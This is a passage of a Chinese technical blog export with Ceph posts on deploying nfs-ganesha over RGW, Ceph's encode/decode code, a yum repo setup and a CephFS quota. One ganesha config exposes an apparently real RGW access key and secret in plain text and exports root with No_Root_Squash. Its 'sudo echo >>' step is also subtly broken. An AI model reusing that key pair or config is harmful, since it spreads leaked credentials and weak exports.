<h2 id="nfs-ganesha编译部署"><a href="#nfs-ganesha编译部署" class="headerlink" title="nfs-ganesha编译部署"></a>nfs-ganesha编译部署</h2><h4 id="获取Project"><a href="#获取Project" class="headerlink" title="获取Project"></a>获取Project</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">// clone nfs-ganesha project</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git <span class="built_in">clone</span> https://github.com/nfs-ganesha/nfs-ganesha.git</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cd</span> ./nfs-ganesha</span></span><br><span class="line"></span><br><span class="line">// 切换到v2.4 stable版本</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git checkout V2.4-stable</span></span><br><span class="line"></span><br><span class="line">// 获取submodule libntirpc</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git submodule update --init</span></span><br></pre></td></tr></table></figure>

<p>在正式开始编译前，需要安装一些包，<code>libntirpc</code>强制使用了GSS，使用<code>-DUSE_GSS=OFF</code>是不能关闭GSS使用的。所以在编译nfs-ganesha时不需要关闭GSS。<br>本人编译使用的系统是rhel7.2，需要安装一些软件包<code>krb5-libs-1.14.1-27.el7_3.x86_64</code>、<code>krb5-devel-1.14.1-27.el7_3.x86_64</code>、<code>libgssglue-0.4-2.el7.nux.x86_64</code>、<code>libgssglue-devel-0.4-2.el7.nux.x86_64</code></p>
<h4 id="编译安装"><a href="#编译安装" class="headerlink" title="编译安装"></a>编译安装</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">// libntirpc 编译 </span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cd</span> ./nfs-ganesha/src/libntirpc</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">cmake ./</span></span><br><span class="line">...</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">make</span></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">// nfs-ganesha 编译</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cd</span> ./nfs-ganesha</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">mkdir</span> ./build</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cd</span> ./build</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">cmake -DUSE_NLM=OFF -DRGW_PREFIX=/usr -DUSE_FSAL_RGW=ON -DUSE_FSAL_CEPH=OFF -DCMAKE_INSTALL_PREFIX=/home/xxxxx/.local -DUSE_GSS=ON -DUSE_FSAL_ZFS=OFF -DUSE_NFSIDMAP=OFF -DUSE_FSAL_GLUSTER=OFF ../src</span></span><br><span class="line">...</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">make</span></span><br><span class="line">...</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">make install</span></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">// 为了能让ganesha正常运行，需要更新一下ld.cache，保证动态库可以正常加载</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> <span class="built_in">echo</span> <span class="string">&quot;/home/xxxxx/.local/lib64/ganesha&quot;</span> &gt;&gt; /etc/ld.so.conf</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> ldconfig -v</span></span><br><span class="line"></span><br><span class="line">//生成RPM包</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">cpack -G RPM</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<h3 id="配置启动"><a href="#配置启动" class="headerlink" title="配置启动"></a>配置启动</h3><h4 id="配置RGW的Keyring"><a href="#配置RGW的Keyring" class="headerlink" title="配置RGW的Keyring"></a>配置RGW的Keyring</h4><p>librgw 访问ceph时会用到keyring，它回去<code>/var/lib/ceph/radosgw/ceph-admin</code>这个目录下去找<code>keyring</code>，这个目录需要用户自己创建并，copy一个keyring进去，这个keyring可以是admin，也可以是rgw实用的keyring，从权限管理角度建议使用rgw的keyring</p>
<h4 id="撰写ganesha-conf-rgw"><a href="#撰写ganesha-conf-rgw" class="headerlink" title="撰写ganesha.conf.rgw"></a>撰写<code>ganesha.conf.rgw</code></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">###################################################</span><br><span class="line">#</span><br><span class="line"># EXPORT</span><br><span class="line">#</span><br><span class="line"># To function, all that is required is an EXPORT</span><br><span class="line">#</span><br><span class="line"># Define the absolute minimal export</span><br><span class="line">#</span><br><span class="line">###################################################</span><br><span class="line"></span><br><span class="line">EXPORT</span><br><span class="line">&#123;</span><br><span class="line">        # Export Id (mandatory, each EXPORT must have a unique Export_Id)</span><br><span class="line">        Export_Id = 1;</span><br><span class="line"></span><br><span class="line">        # Exported path (mandatory)</span><br><span class="line">        Path = &quot;nfs_bucket&quot;;</span><br><span class="line"></span><br><span class="line">        # Pseudo Path (required for NFS v4)</span><br><span class="line">        Pseudo = &quot;/nfs_bucket&quot;;</span><br><span class="line"></span><br><span class="line">        # Required for access (default is None)</span><br><span class="line">        # Could use CLIENT blocks instead</span><br><span class="line">        Access_Type = RW;</span><br><span class="line">        Protocols = 4;</span><br><span class="line">        Transports = TCP;</span><br><span class="line"></span><br><span class="line">        # Exporting FSAL</span><br><span class="line">        FSAL &#123;</span><br><span class="line">             # Name = VFS;</span><br><span class="line">             Name = RGW;</span><br><span class="line">             User_Id = &quot;xxxxxxxxxxx&quot;;</span><br><span class="line">             Access_Key_Id = &quot;xxxxxxxxxxxxxxxxxxxx&quot;;</span><br><span class="line">             Secret_Access_Key = &quot;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">RGW &#123;</span><br><span class="line">        ceph_conf = &quot;/etc/ceph/ceph.conf&quot;;</span><br><span class="line">        name = &quot;client.admin&quot;;</span><br><span class="line">        cluster = &quot;ceph&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="运行ganesha进程"><a href="#运行ganesha进程" class="headerlink" title="运行ganesha进程"></a>运行ganesha进程</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo ganesha.nfsd -f /home/xxxxx/.local/etc/ganesha/ganesha.conf.rgw -F -L /var/log/ganesha.log</span><br></pre></td></tr></table></figure>

<h4 id="客户端连接"><a href="#客户端连接" class="headerlink" title="客户端连接"></a>客户端连接</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo mount -t nfs4 192.168.1.82:/nfs_bucket /mnt</span><br></pre></td></tr></table></figure>


<h2 id="docker容器部署"><a href="#docker容器部署" class="headerlink" title="docker容器部署"></a>docker容器部署</h2><h3 id="镜像"><a href="#镜像" class="headerlink" title="镜像"></a>镜像</h3><p><a href="https://hub.docker.com/r/ananace/nfs-ganesha-ceph">ananace&#x2F;nfs-ganesha-ceph</a></p>
<h3 id="gannesha配置"><a href="#gannesha配置" class="headerlink" title="gannesha配置"></a>gannesha配置</h3><p>配置上来讲与编译部署没有太大差别</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># NFS protocol options</span><br><span class="line">EXPORT</span><br><span class="line">&#123;</span><br><span class="line">  # Export Id (mandatory, each EXPORT must have a unique Export_Id)</span><br><span class="line">  Export_Id = 77;</span><br><span class="line"></span><br><span class="line">  # Exported path (mandatory)</span><br><span class="line">  Path = /;</span><br><span class="line"></span><br><span class="line">  # Pseudo Path (for NFS v4)</span><br><span class="line">  Pseudo = /;</span><br><span class="line"></span><br><span class="line">  # Access control options</span><br><span class="line">  Access_Type = RW;</span><br><span class="line">  Squash = No_Root_Squash;</span><br><span class="line"></span><br><span class="line">  # NFS protocol options</span><br><span class="line">  SecType = &quot;sys&quot;;</span><br><span class="line">  Transports = TCP;</span><br><span class="line">  Protocols = 4;</span><br><span class="line"></span><br><span class="line">  # Exporting FSAL</span><br><span class="line">  FSAL &#123;</span><br><span class="line">    Name = RGW;</span><br><span class="line">    User_Id = &quot;admin&quot;;</span><br><span class="line">    Access_Key_Id = &quot;8I4K2USDV5SK3UFLQUB0&quot;;</span><br><span class="line">    Secret_Access_Key = &quot;A4JuvB468tmnDpmkZMfwesb2zmGZeSiCJlzJMALc&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">RGW &#123;</span><br><span class="line">    cluster = &quot;ceph&quot;;</span><br><span class="line">    ceph_conf = &quot;/etc/ceph/ceph.conf&quot;;</span><br><span class="line">    name = &quot;client.rgw.host-10-100-13-111&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="运行ganesha容器"><a href="#运行ganesha容器" class="headerlink" title="运行ganesha容器"></a>运行ganesha容器</h3><p>由于Ganesha 的 FSAL 使用到了librgw，所以在镜像中会装好<code>ceph-common</code>、<code>librgw2</code>等。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run -d --net=host  -v /home/xxx/ceph/etc_ceph/:/etc/ceph:ro -v /home/xxx/ceph/ganesha/:/etc/ganesha:ro -v /home/xxx/ceph/var_lib_ceph/:/var/lib/ceph --name nfs -e GANESHA_BOOTSTRAP_CONFIG=no ananace/nfs-ganesha-ceph</span><br></pre></td></tr></table></figure>
<p>docker 启动是需要设置环境变量<code>GANESHA_BOOTSTRAP_CONFIG=no</code>，默认配置为<code>yes</code>；若为<code>yes</code>的化，nfs-ganesha在启动的时候会重置<code>/etc/ganesha/ganesha.conf</code>配置文件。</p>
<h1 id="参考-鸣谢"><a href="#参考-鸣谢" class="headerlink" title="参考&amp;鸣谢"></a>参考&amp;鸣谢</h1><ul>
<li><a href="https://github.com/nfs-ganesha/nfs-ganesha/issues/152">Will not compile with USE_GSS&#x3D;”OFF”</a></li>
<li><a href="http://www.tuicool.com/articles/yAV7R3N">rgw实现nfs的首测</a></li>
<li><a href="http://www.tuicool.com/articles/JFRn2me">NFS + CephFS 构建基于 Ceph 的 NAS 服务</a></li>
<li><a href="http://www.php230.com/1492048922.html">通过ganesha-nfs将 Ceph 导出为 NFS</a></li>
<li><a href="http://www.cnblogs.com/alexyuyu/articles/3509255.html">LD_LIBRARY_PATH</a></li>
<li><a href="https://hub.docker.com/r/ananace/nfs-ganesha-ceph">ananace&#x2F;nfs-ganesha-ceph</a></li>
</ul>
]]></content>
      <categories>
        <category>storage</category>
      </categories>
      <tags>
        <tag>ceph</tag>
        <tag>docker</tag>
        <tag>radosgw</tag>
        <tag>nfs</tag>
      </tags>
  </entry>
  <entry>
    <title>encode和decode</title>
    <url>/2021/12/18/storage/ceph/ceph-encode-decode/</url>
    <content><![CDATA[<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">object_t</span> &#123;</span><br><span class="line">  std::string name;</span><br><span class="line"></span><br><span class="line">  ......</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">encode</span><span class="params">(ceph::buffer::list &amp;bl)</span> <span class="type">const</span> </span>&#123;</span><br><span class="line">    <span class="keyword">using</span> ceph::encode;</span><br><span class="line">    <span class="built_in">encode</span>(name, bl);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">decode</span><span class="params">(ceph::buffer::list::const_iterator &amp;bl)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">using</span> ceph::decode;</span><br><span class="line">    <span class="built_in">decode</span>(name, bl);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">WRITE_CLASS_ENCODER</span>(<span class="type">object_t</span>)</span><br></pre></td></tr></table></figure>
<p>*** From: src&#x2F;include&#x2F;object.h ***</p>
<p>对于Ceph中的每一种需要存储的资源在进行存储前都要进行<code>encode</code>操作，然后再将其写入硬盘。对于读取同样，在从硬盘获取到数据后需要进行<code>decode</code>操作。而每种需要存储资源如何<code>encode</code>和<code>decode</code>当然要由资源自己来决定。所以在资源的<code>class</code>或<code>struct</code>中要实现<code>encode</code>和<code>decode</code>方法。</p>
<p><code>WRITE_CLASS_ENCODER(object_t)</code>干了些啥呢。。。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// see denc.h for ENCODE_DUMP_PATH discussion and definition.</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> ENCODE_DUMP_PATH</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> ENCODE_DUMP_PRE()                      \</span></span><br><span class="line"><span class="meta">  unsigned pre_off = bl.length()</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> ENCODE_DUMP_POST(cl)                                           \</span></span><br><span class="line"><span class="meta">  do &#123;                                                                  \</span></span><br><span class="line"><span class="meta">    static int i = 0;                                                   \</span></span><br><span class="line"><span class="meta">    i++;                                                                \</span></span><br><span class="line"><span class="meta">    int bits = 0;                                                       \</span></span><br><span class="line"><span class="meta">    for (unsigned t = i; t; bits++)                                     \</span></span><br><span class="line"><span class="meta">      t &amp;= t - 1;                                                       \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (bits &gt; 2)                                                       \</span></span><br><span class="line"><span class="meta">      break;                                                            \</span></span><br><span class="line"><span class="meta">    char fn[PATH_MAX];                                                  \</span></span><br><span class="line"><span class="meta">    snprintf(fn, sizeof(fn), ENCODE_STRINGIFY(ENCODE_DUMP_PATH) <span class="string">&quot;/%s__%d.%x&quot;</span>, #cl, getpid(), i++); \</span></span><br><span class="line"><span class="meta">    int fd = ::open(fn, O_WRONLY|O_TRUNC|O_CREAT|O_CLOEXEC|O_BINARY, 0644);             \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (fd &gt;= 0) &#123;                                                      \</span></span><br><span class="line"><span class="meta">      ::ceph::bufferlist sub;                                           \</span></span><br><span class="line"><span class="meta">      sub.substr_of(bl, pre_off, bl.length() - pre_off);                \</span></span><br><span class="line"><span class="meta">      sub.write_fd(fd);                                                 \</span></span><br><span class="line"><span class="meta">      ::close(fd);                                                      \</span></span><br><span class="line"><span class="meta">    &#125;                                                                   \</span></span><br><span class="line"><span class="meta">  &#125; while (0)</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> ENCODE_DUMP_PRE()</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> ENCODE_DUMP_POST(cl)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WRITE_CLASS_ENCODER(cl)                                         \</span></span><br><span class="line"><span class="meta">  inline void encode(const cl&amp; c, ::ceph::buffer::list &amp;bl, uint64_t features=0) &#123; \</span></span><br><span class="line"><span class="meta">    ENCODE_DUMP_PRE(); c.encode(bl); ENCODE_DUMP_POST(cl); &#125;            \</span></span><br><span class="line"><span class="meta">  inline void decode(cl &amp;c, ::ceph::bufferlist::const_iterator &amp;p) &#123; c.decode(p); &#125;</span></span><br></pre></td></tr></table></figure>
<p>*** From: src&#x2F;include&#x2F;encoding.h ***</p>
<p>看了上面的代码应该能了解到<code>WRITE_CLASS_ENCODER(object_t)</code>是对<code>encode</code>和<code>decode</code>函数的重载。这是入口，然后再调用其资源自身<code>encode</code>或<code>decode</code>方法。</p>
<p>那么对于一些基础类型（如：int、string等）是如果<code>encode</code>和<code>decode</code>的呢？</p>
<h3 id="int类型"><a href="#int类型" class="headerlink" title="int类型"></a>int类型</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// int types</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WRITE_INTTYPE_ENCODER(type, etype)                              \</span></span><br><span class="line"><span class="meta">  inline void encode(type v, ::ceph::bufferlist&amp; bl, uint64_t features=0) &#123; \</span></span><br><span class="line"><span class="meta">    ceph_##etype e;                                                     \</span></span><br><span class="line"><span class="meta">    e = v;                                                              \</span></span><br><span class="line"><span class="meta">    ::ceph::encode_raw(e, bl);                                          \</span></span><br><span class="line"><span class="meta">  &#125;                                                                     \</span></span><br><span class="line"><span class="meta">  inline void decode(type &amp;v, ::ceph::bufferlist::const_iterator&amp; p) &#123;  \</span></span><br><span class="line"><span class="meta">    ceph_##etype e;                                                     \</span></span><br><span class="line"><span class="meta">    ::ceph::decode_raw(e, p);                                           \</span></span><br><span class="line"><span class="meta">    v = e;                                                              \</span></span><br><span class="line"><span class="meta">  &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">WRITE_INTTYPE_ENCODER</span>(<span class="type">uint64_t</span>, le64)</span><br><span class="line"><span class="built_in">WRITE_INTTYPE_ENCODER</span>(<span class="type">int64_t</span>, le64)</span><br><span class="line"><span class="built_in">WRITE_INTTYPE_ENCODER</span>(<span class="type">uint32_t</span>, le32)</span><br><span class="line"><span class="built_in">WRITE_INTTYPE_ENCODER</span>(<span class="type">int32_t</span>, le32)</span><br><span class="line"><span class="built_in">WRITE_INTTYPE_ENCODER</span>(<span class="type">uint16_t</span>, le16)</span><br><span class="line"><span class="built_in">WRITE_INTTYPE_ENCODER</span>(<span class="type">int16_t</span>, le16)</span><br></pre></td></tr></table></figure>
<p>*** From: src&#x2F;include&#x2F;encoding.h ***</p>
<p>int类型的<code>encode</code>和<code>decode</code>又调用了<code>encode_raw</code>和<code>decode_raw</code>。真是一层套一层啊～（俄罗斯套娃嘛）～</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// base types</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">class</span> T&gt;</span></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">encode_raw</span><span class="params">(<span class="type">const</span> T&amp; t, bufferlist&amp; bl)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  bl.<span class="built_in">append</span>((<span class="type">char</span>*)&amp;t, <span class="built_in">sizeof</span>(t));</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">class</span> T&gt;</span></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">decode_raw</span><span class="params">(T&amp; t, bufferlist::const_iterator &amp;p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  p.<span class="built_in">copy</span>(<span class="built_in">sizeof</span>(t), (<span class="type">char</span>*)&amp;t);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WRITE_RAW_ENCODER(type)                                         \</span></span><br><span class="line"><span class="meta">  inline void encode(const type &amp;v, ::ceph::bufferlist&amp; bl, uint64_t features=0) &#123; ::ceph::encode_raw(v, bl); &#125; \</span></span><br><span class="line"><span class="meta">  inline void decode(type &amp;v, ::ceph::bufferlist::const_iterator&amp; p) &#123; ::ceph::decode_raw(v, p); &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">WRITE_RAW_ENCODER</span>(__u8)</span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> _CHAR_IS_SIGNED</span></span><br><span class="line"><span class="built_in">WRITE_RAW_ENCODER</span>(__s8)</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="built_in">WRITE_RAW_ENCODER</span>(<span class="type">char</span>)</span><br><span class="line"><span class="built_in">WRITE_RAW_ENCODER</span>(ceph_le64)</span><br><span class="line"><span class="built_in">WRITE_RAW_ENCODER</span>(ceph_le32)</span><br><span class="line"><span class="built_in">WRITE_RAW_ENCODER</span>(ceph_le16)</span><br></pre></td></tr></table></figure>
<p>*** From: src&#x2F;include&#x2F;encoding.h ***</p>
<p>base比较简单，就是无论int几个字节，都是从低到高一个字节一个字节的写下去，再一个字节一个字节的读出来。。。</p>
<h3 id="float类型"><a href="#float类型" class="headerlink" title="float类型"></a>float类型</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> WRITE_FLTTYPE_ENCODER(type, itype, etype)                       \</span></span><br><span class="line"><span class="meta">  static_assert(sizeof(type) == sizeof(itype));                         \</span></span><br><span class="line"><span class="meta">  static_assert(std::numeric_limits<span class="string">&lt;type&gt;</span>::is_iec559,                   \</span></span><br><span class="line"><span class="meta">              <span class="string">&quot;floating-point type not using IEEE754 format&quot;</span>);          \</span></span><br><span class="line"><span class="meta">  inline void encode(type v, ::ceph::bufferlist&amp; bl, uint64_t features=0) &#123; \</span></span><br><span class="line"><span class="meta">    ceph_##etype e;                                                     \</span></span><br><span class="line"><span class="meta">    e = *reinterpret_cast<span class="string">&lt;itype *&gt;</span>(&amp;v);                                 \</span></span><br><span class="line"><span class="meta">    ::ceph::encode_raw(e, bl);                                          \</span></span><br><span class="line"><span class="meta">  &#125;                                                                     \</span></span><br><span class="line"><span class="meta">  inline void decode(type &amp;v, ::ceph::bufferlist::const_iterator&amp; p) &#123;  \</span></span><br><span class="line"><span class="meta">    ceph_##etype e;                                                     \</span></span><br><span class="line"><span class="meta">    ::ceph::decode_raw(e, p);                                           \</span></span><br><span class="line"><span class="meta">    *reinterpret_cast<span class="string">&lt;itype *&gt;</span>(&amp;v) = e;                                 \</span></span><br><span class="line"><span class="meta">  &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">WRITE_FLTTYPE_ENCODER</span>(<span class="type">float</span>, <span class="type">uint32_t</span>, le32)</span><br><span class="line"><span class="built_in">WRITE_FLTTYPE_ENCODER</span>(<span class="type">double</span>, <span class="type">uint64_t</span>, le64)</span><br></pre></td></tr></table></figure>
<p>*** From: src&#x2F;include&#x2F;encoding.h ***</p>
<p>float类型关键在于<code>reinterpret_cast</code>将一个浮点数转换为整数。<a href="https://zh.cppreference.com/w/cpp/language/reinterpret_cast">更多关于<code>reinterpret_cast</code>的内容</a></p>
<h3 id="string"><a href="#string" class="headerlink" title="string"></a>string</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// string</span></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">encode</span><span class="params">(std::string_view s, bufferlist&amp; bl, <span class="type">uint64_t</span> features=<span class="number">0</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __u32 len = s.<span class="built_in">length</span>();</span><br><span class="line">  <span class="built_in">encode</span>(len, bl);</span><br><span class="line">  <span class="keyword">if</span> (len)</span><br><span class="line">    bl.<span class="built_in">append</span>(s.<span class="built_in">data</span>(), len);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">encode</span><span class="params">(<span class="type">const</span> std::string&amp; s, bufferlist&amp; bl, <span class="type">uint64_t</span> features=<span class="number">0</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">encode</span>(std::<span class="built_in">string_view</span>(s), bl, features);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">decode</span><span class="params">(std::string&amp; s, bufferlist::const_iterator&amp; p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __u32 len;</span><br><span class="line">  <span class="built_in">decode</span>(len, p);</span><br><span class="line">  s.<span class="built_in">clear</span>();</span><br><span class="line">  p.<span class="built_in">copy</span>(len, s);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">encode_nohead</span><span class="params">(std::string_view s, bufferlist&amp; bl)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  bl.<span class="built_in">append</span>(s.<span class="built_in">data</span>(), s.<span class="built_in">length</span>());</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">encode_nohead</span><span class="params">(<span class="type">const</span> std::string&amp; s, bufferlist&amp; bl)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">encode_nohead</span>(std::<span class="built_in">string_view</span>(s), bl);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">decode_nohead</span><span class="params">(<span class="type">int</span> len, std::string&amp; s, bufferlist::const_iterator&amp; p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  s.<span class="built_in">clear</span>();</span><br><span class="line">  p.<span class="built_in">copy</span>(len, s);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// const char* (encode only, string compatible)</span></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">encode</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *s, bufferlist&amp; bl)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">encode</span>(std::<span class="built_in">string_view</span>(s, <span class="built_in">strlen</span>(s)), bl);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>*** From: src&#x2F;include&#x2F;encoding.h ***</p>
<p>string的<code>encode</code>和<code>decode</code>分两种，一种是有“害的”(head)，一种是无“害的”。有“害的”需要先记录string的长度，再记录string的内容；无“害的”直接记录内容，单再<code>decode</code>过程中需要制定长度。总之这个长度总要有个人来记。好鸡肋！</p>
<hr>
<p>整个的<code>encode</code>和<code>decode</code>的过程用到了一个<code>bufferlist</code>类型，那么这个<code>bufferlist</code>又是个什么结构呢，详细请见<a href="">ceph中的buffer</a></p>
]]></content>
      <categories>
        <category>storage</category>
      </categories>
      <tags>
        <tag>ceph</tag>
      </tags>
  </entry>
  <entry>
    <title>ceph-repo 仓库搭建</title>
    <url>/2019/12/11/storage/ceph/ceph-repo/</url>
    <content><![CDATA[<h1 id="Yum源"><a href="#Yum源" class="headerlink" title="Yum源"></a>Yum源</h1><h2 id="安装createrepo"><a href="#安装createrepo" class="headerlink" title="安装createrepo"></a>安装createrepo</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum install -y createrepo</span><br></pre></td></tr></table></figure>

<h2 id="创建仓库"><a href="#创建仓库" class="headerlink" title="创建仓库"></a>创建仓库</h2><p>使用<code>createrepo</code>工具创建、更新仓库</p>
<p>按Yum源的规则创建目录树<code>rpm-&lt;ceph版本名称&gt;/&lt;os version&gt;/&lt;arch&gt;</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir -p ./ceph_repo/rpm-mimic/el7/x86_64/</span><br><span class="line">mkdir -p ./ceph_repo/rpm-mimic/el7/noarch/</span><br></pre></td></tr></table></figure>
<p>创建完目录树之后，将不同arch的rpm包copy到对应的目录中。然后在创建仓库</p>
<p>创建仓库</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">createrepo ./ceph_repo/rpm-mimic/el7/x86_64</span><br><span class="line">createrepo ./ceph_repo/rpm-mimic/el7/noarch</span><br></pre></td></tr></table></figure>
<p>若仓库中RPM有更新、增加、删除，需要更新仓库</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">createrepo --update ./ceph_repo/rpm-mimic/el7/x86_64/</span><br></pre></td></tr></table></figure>

<h2 id="发布仓库"><a href="#发布仓库" class="headerlink" title="发布仓库"></a>发布仓库</h2><p>本示例以docker形式发布仓库</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run -d --net=host --name ceph_repo -v $PWD/ceph_repo:/root/repo -w /root/repo/ --restart=always python:3 python -m http.server 80</span><br></pre></td></tr></table></figure>
<p>or</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run -d --net=host --name ceph_repo -v $PWD/ceph_repo:/root/repo -w /root/repo/ --restart=always python:3 python -m SimpleHTTPServer 80</span><br></pre></td></tr></table></figure>

<h1 id="参考-鸣谢"><a href="#参考-鸣谢" class="headerlink" title="参考&amp;鸣谢"></a>参考&amp;鸣谢</h1><ul>
<li><a href="https://www.cnblogs.com/mython/p/10898461.html">yum源仓库的三种搭建方式</a></li>
</ul>
]]></content>
      <categories>
        <category>storage</category>
      </categories>
      <tags>
        <tag>ceph</tag>
      </tags>
  </entry>
  <entry>
    <title>cephfs export</title>
    <url>/2019/11/28/storage/ceph/cephfs-export/</url>
    <content><![CDATA[<h1 id="export-cephfs"><a href="#export-cephfs" class="headerlink" title="export cephfs"></a>export cephfs</h1><h3 id="创建用户目录"><a href="#创建用户目录" class="headerlink" title="创建用户目录"></a>创建用户目录</h3><p>使用<code>admin</code>用户将根目录挂载，并创建用户使用需要的目录</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mount -t ceph &lt;monitor ip&gt;:6789:/ /mnt/ -o name=admin,secret=xxxxxxxxxxxxxxxxxxxxxxxx==</span><br></pre></td></tr></table></figure>
<p>在<code>/mnt</code>目录下创建<code>kubefs</code>目录</p>
<h3 id="给目录设置配额-Quota"><a href="#给目录设置配额-Quota" class="headerlink" title="给目录设置配额(Quota)"></a>给目录设置配额(Quota)</h3><p>设置目录配额是linux内核本身提供的功能，cephfs只是支持了该功能。设置前需要先安装attr的rpm包<code>yum install -y attr</code>。</p>
<p>设置目录配额</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">setfattr -n ceph.quota.size_bytes -v &lt;size byte&gt; /mnt/kubefs</span><br></pre></td></tr></table></figure>
<p>通过<code>getfattr</code>可以获取该quota值。</p>
<p>cephfs quota 不能精确的限制配额，容量统计有延时，大概10s左右。</p>
